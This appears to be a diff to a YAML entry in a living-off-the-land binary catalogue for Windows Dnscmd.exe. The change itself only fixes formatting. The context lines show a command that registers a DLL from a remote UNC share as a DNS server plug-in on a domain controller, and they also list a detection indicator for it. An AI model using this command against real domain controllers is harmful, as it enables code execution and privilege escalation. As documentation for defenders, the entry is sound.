@@ -2,7 +2,7 @@
 Name: Dnscmd.exe
 Description: A command-line interface for managing DNS servers
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
     Description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
@@ -15,7 +15,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\Dnscmd.exe
   - Path: C:\Windows\SysWOW64\Dnscmd.exe
-Code_Sample: 
+Code_Sample:
 - Code:
 Detection:
  - IOC: Dnscmd.exe loading dll from UNC path
